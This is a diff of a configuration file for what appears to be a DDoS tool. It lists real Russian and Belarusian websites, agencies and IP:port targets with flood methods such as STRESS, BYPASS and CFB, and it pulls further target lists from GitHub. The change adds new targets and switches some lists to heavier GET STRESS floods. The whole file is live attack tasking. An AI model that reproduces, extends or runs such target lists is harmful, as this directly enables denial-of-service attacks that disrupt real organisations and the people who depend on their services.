@@ -1,7 +1,7 @@
 
 
 ### rusvesna.su https://t.me/c/1624648668/87
-http://rusvesna.su/ http://m.rusvesna.su/ --http-methods CFB CFBUAM
+#http://rusvesna.su/ http://m.rusvesna.su/ --http-methods CFB CFBUAM
 
 # https://carte.by/vitebsk/dostavka/
 #https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443 tcp://193.176.182.165:2326  --http-methods BYPASS GET STRESS
@@ -25,6 +25,8 @@ tcp://185.165.123.40:80 tcp://185.165.123.40:443 tcp://178.248.238.208:80 tcp://
 #https://fstec.ru/ http://fstec.ru/ --http-methods CFB
 
 https://www.cryptopro.ru/order/OrderForm.aspx?catid=c26ac260-7cfc-e811-870f-0025900a9ce7~ http://178.238.112.83:80 http://178.238.112.83:443 https://178.238.112.83:443 tcp://178.238.112.83:80 tcp://178.238.112.83:443 --http-methods GET POST
+
+https://www.babochka.ru/stores https://spb.aport.ru/odezhda_i_obuv/cat5645 https://spb.aport.ru http://139.45.250.90:80 https://139.45.250.90:443 tcp://139.45.250.90:80 tcp://139.45.250.90:443 tcp://139.45.250.90:8111 tcp://139.45.250.90:40443 tcp://23.111.103.204:22 tcp://23.111.103.204:80 tcp://23.111.103.204:123 tcp://23.111.103.204:443 --http-methods GET STRESS
 
 https://zala-aero.com/about/ https://zala-aero.com/production/ http://37.143.13.3:80 http://37.143.13.3:443 https://37.143.13.3:443 http://37.143.13.3:1500 https://37.143.13.3:1500 tcp://37.143.13.3:21 tcp://37.143.13.3:22 tcp://37.143.13.3:25 tcp://37.143.13.3:80 tcp://37.143.13.3:110 tcp://37.143.13.3:123 tcp://37.143.13.3:143 tcp://37.143.13.3:443 tcp://37.143.13.3:993 tcp://37.143.13.3:995 tcp://37.143.13.3:1500 --http-methods GET STRESS
 
@@ -68,9 +70,9 @@ http://roszdravnadzor.gov.ru http://95.173.145.58:80 http://95.173.145.58:443 ht
 
 -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods BYPASS CFB
 
--c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods HEAD POST
+-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods HEAD POST
+-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods GET STRESS
 
 #-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/udp.lst
 
@@ -86,7 +88,7 @@ https://www.ponyexpress.ru/ tcp://185.10.63.194:80 tcp://185.10.63.194:443 --htt
 
 https://term.atol.ru https://www.atol.ru https://online.atol.ru tcp://178.57.71.182:443 tcp://178.57.71.189:443 tcp://178.57.71.190:443 tcp://185.31.134.103:443 tcp://185.31.134.104:443 --http-methods STRESS GET
 
-https://ekdostavka.ru http://ekdostavka.ru 82.202.172.28:80 82.202.172.28:443 https://82.202.172.28:443 tcp://82.202.172.28:21 tcp://82.202.172.28:22 tcp://82.202.172.28:80 tcp://82.202.172.28:443 tcp://82.202.172.28:587 tcp://82.202.172.28:110 tcp://82.202.172.28:993 tcp://82.202.172.28:995 --http-methods STRESS GET HEAD
+#https://ekdostavka.ru http://ekdostavka.ru 82.202.172.28:80 82.202.172.28:443 https://82.202.172.28:443 tcp://82.202.172.28:21 tcp://82.202.172.28:22 tcp://82.202.172.28:80 tcp://82.202.172.28:443 tcp://82.202.172.28:587 tcp://82.202.172.28:110 tcp://82.202.172.28:993 tcp://82.202.172.28:995 --http-methods STRESS GET HEAD
 
 #https://www.5-tv.ru http://www.5-tv.ru https://www.5-tv.ru/schedule/ http://ctv.by http://ctv.by/tv-programm-voskr https://www.sb.by https://www.sb.by/articles/themes/situatsiya-vokrug-dnr-i-lnr/ 151.236.80.10:80 151.236.80.10:443 https://151.236.80.10:443 tcp://151.236.80.10:80 tcp://151.236.80.10:443 tcp://93.85.84.202:22 tcp://93.85.84.202:80 tcp://93.85.84.202:443 --http-methods stress bypass head
 
